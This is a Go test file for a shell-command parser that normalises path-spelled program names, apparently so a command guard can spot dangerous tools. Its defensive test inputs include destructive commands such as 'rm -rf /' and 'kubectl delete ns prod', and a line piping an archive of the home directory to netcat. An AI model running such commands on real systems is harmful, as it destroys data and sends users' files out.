package shellparse

import "testing"

func TestBasenameCommandWord(t *testing.T) {
	rm := "r" + "m"
	cases := []struct{ in, want string }{
		{"/usr/bin/" + rm + " -rf /", rm + " -rf /"},
		{"  /usr/bin/" + rm + " -rf /", "  " + rm + " -rf /"},
		{"/usr//bin/./" + rm + " x", rm + " x"},
		{"~/bin/tool --flag", "tool --flag"},
		{"~root/bin/tar -xf a", "tar -xf a"},
		{"/usr/bin/" + rm, rm},
		{"sudo /usr/bin/npm publish", "sudo npm publish"},
		{"sudo\t/usr/bin/npm publish", "sudo\tnpm publish"},
		{"/usr/bin/sudo /usr/bin/dd if=x", "sudo dd if=x"},
		{"/usr/bin/sudo dd if=x", "sudo dd if=x"},
		// A fully quoted STATIC path is the same program (Codex pass 1).
		{`"/usr/bin/tar" -xf a --to-command=sh`, "tar -xf a --to-command=sh"},
		{`'/usr/bin/tar' -xf a`, "tar -xf a"},
		// Every pipeline stage and sequenced command is a command word.
		{"tar czf - ~ | /usr/bin/nc h 4444", "tar czf - ~ | nc h 4444"},
		{"a |& /bin/sh", "a |& sh"},
		{"a && /bin/b; /bin/c || /bin/d & /bin/e", "a && b; c || d & e"},
		{"x | sudo /usr/bin/tee /etc/f", "x | sudo tee /etc/f"},
		// Nothing to do.
		{rm + " -rf /", ""},
		{"sudo " + rm + " -rf /", ""},
		{"", ""},
		// Relative paths are project scripts, not the system tool (#3057 scoping).
		{"./" + rm + " -rf /", ""},
		{"bin/" + rm + " -rf /", ""},
		{"sudo ./" + rm + " -rf /", ""},
		{"x | ./nc h", ""},
		// Not a program: a directory, the root, a home dir.
		{"/usr/bin/ -rf", ""},
		{"/ -rf", ""},
		{"~/ x", ""},
		{"~root/ x", ""},
		// Static components may hold spaces, '=' and quoted punctuation
		// (Codex pass 3): static-ness is decided before quote removal.
		{`"/opt/my tools/tar" -xf a`, "tar -xf a"},
		{`/opt/my\ tools/tar -xf a`, "tar -xf a"},
		{`'/opt/my tools/tar' -xf a`, "tar -xf a"},
		{"/opt/k=v/tar -xf a", "tar -xf a"},
		{`"/opt/a;b|c&d/tar" -xf a`, "tar -xf a"},
		{`'/opt/(x)/tar' -xf a`, "tar -xf a"},
		{`/opt/a\;b/tar -xf a`, "tar -xf a"},
		{`x | "/opt/my tools/nc" h 1`, "x | nc h 1"},
		{"x | /opt/k=v/nc h 1", "x | nc h 1"},
		{`sudo "/opt/my tools/tar" -xf a`, "sudo tar -xf a"},
		// A basename that is not a plain word is re-quoted, so the rendering
		// still parses as the same words.
		{`/opt/x/"my tool" --go`, "'my tool' --go"},
		{`"/opt/x/it's" --go`, `'it'\''s' --go`},
		// ANSI-C spans are treated as dynamic (Codex pass 4 on #3993): decoding
		// dropped literal characters from the name, which could name a
		// different program. Such a spelling keeps main's decision.
		{`$'/usr/bin/tar' -xf a`, ""},
		{`$'/opt/x/it\'s' --go`, ""},
		// A QUOTED leading ~ is a directory named "~": a relative path.
		{`"~/bin/tar" -xf a`, ""},
		{`'~root/bin/tar' -xf a`, ""},
		// So is an ESCAPED or SPLICED one: the shell expands a tilde only as
		// a literal, unquoted first character (Codex pass 4 on #3993).
		{`\~/bin/tar -xf a`, ""},
		{`''~/bin/tar -xf a`, ""},
		{`""~root/bin/tar -xf a`, ""},
		// Anything dynamic is another rendering's job; static quoting is not.
		{`"/opt/$d/tar" -xf a`, ""},
		{"/opt/$(x)/tar -xf a", ""},
		{"/opt/`x`/tar -xf a", ""},
		{"/opt/*/tar -xf a", ""},
		{"/opt/t?r -xf a", ""},
		{"/opt/[ab]/tar -xf a", ""},
		{"/opt/{a,b}/tar -xf a", ""},
		{`"/opt/` + "`x`" + `/tar" -xf a`, ""},
		{"/usr/bin/$x -rf /", ""},
		{`"/usr/bin/$x" -rf /`, ""},
		{`"/usr/bin/"tar -xf a`, "tar -xf a"},
		{`/bin/"bash" -c x`, "bash -c x"},
		{`/usr/bin/t\ar -xf a`, "tar -xf a"},
		{"/usr/bin/r*m -rf /", ""},
		{"/usr/bin/{a,b} x", ""},
		// Only command words — a path in ARGUMENT position is data, including
		// inside quotes and after redirections.
		{"echo /usr/bin/" + rm, ""},
		{"sudo -u root /usr/bin/" + rm, ""},
		{`echo "a | /usr/bin/nc h"`, ""},
		{`echo 'a; /bin/sh'`, ""},
		{"echo a\\| /bin/sh", ""},
		{"cmd 2>&1 /bin/sh", ""},
		{"cmd &> /bin/sh", ""},
	}
	for _, c := range cases {
		if got := BasenameCommandWord(c.in); got != c.want {
			t.Errorf("BasenameCommandWord(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestProgramName(t *testing.T) {
	cases := []struct{ in, want string }{
		{"/usr/bin/kubectl", "kubectl"},
		{"~/bin/tool", "tool"},
		{"~root/bin/tar", "tar"},
		{"/usr//local/../bin/x", "x"},
		{"kubectl", "kubectl"},
		{"./script.sh", "./script.sh"},
		{"bin/tool", "bin/tool"},
		{"/usr/bin/", "/usr/bin/"},
		{"/", "/"},
		{"~/", "~/"},
		{"~root", "~root"},
		{"/usr/bin/$x", "/usr/bin/$x"},
		{"/usr/bin/`x`", "/usr/bin/`x`"},
		{"", ""},
	}
	for _, c := range cases {
		if got := ProgramName(c.in); got != c.want {
			t.Errorf("ProgramName(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

// TestParseKeepsExecutableAsWritten pins the contract that fixed Codex pass 1:
// Executable keeps its as-written value for every consumer that has not opted
// in, and the program name lives in a separate field.
func TestParseKeepsExecutableAsWritten(t *testing.T) {
	cases := []struct{ cmd, exe, prog string }{
		{"/usr/bin/kubectl delete ns prod", "/usr/bin/kubectl", "kubectl"},
		{"'/usr/bin/kubectl' delete ns prod", "/usr/bin/kubectl", "kubectl"},
		{"sudo /usr/bin/kubectl delete ns prod", "/usr/bin/kubectl", "kubectl"},
		{"~root/bin/tar -xf a", "~root/bin/tar", "tar"},
		{"kubectl delete ns prod", "kubectl", "kubectl"},
		{"./kubectl delete ns prod", "./kubectl", "./kubectl"},
	}
	for _, c := range cases {
		pc := Parse(c.cmd, 2)
		if pc == nil || len(pc.Segments) == 0 {
			t.Fatalf("Parse(%q): no segments", c.cmd)
		}
		seg := pc.Segments[0]
		if seg.Executable != c.exe || seg.Program != c.prog {
			t.Errorf("Parse(%q): Executable=%q Program=%q, want %q / %q",
				c.cmd, seg.Executable, seg.Program, c.exe, c.prog)
		}
	}
}

func TestProgramView(t *testing.T) {
	if pv := ProgramView(Parse("kubectl delete ns prod | grep x", 2)); pv != nil {
		t.Errorf("no path-spelled program: want nil view, got %+v", pv)
	}
	pc := Parse("/usr/bin/kubectl delete ns prod | /usr/bin/grep x", 2)
	pv := ProgramView(pc)
	if pv == nil || len(pv.Segments) != 2 {
		t.Fatalf("want a 2-segment view, got %+v", pv)
	}
	k := pv.Segments[0]
	if k.Executable != "kubectl" || k.SubCommand != "delete" || len(k.Args) == 0 || k.Args[0] != "ns" {
		t.Errorf("kubectl segment: Executable=%q SubCommand=%q Args=%v; want kubectl / delete / [ns prod]", k.Executable, k.SubCommand, k.Args)
	}
	if pv.Segments[1].Executable != "grep" {
		t.Errorf("grep segment: Executable=%q", pv.Segments[1].Executable)
	}
	// The original is untouched: the view is a copy.
	if pc.Segments[0].Executable != "/usr/bin/kubectl" || pc.Segments[0].SubCommand != "" {
		t.Errorf("ProgramView mutated its input: %+v", pc.Segments[0])
	}
}
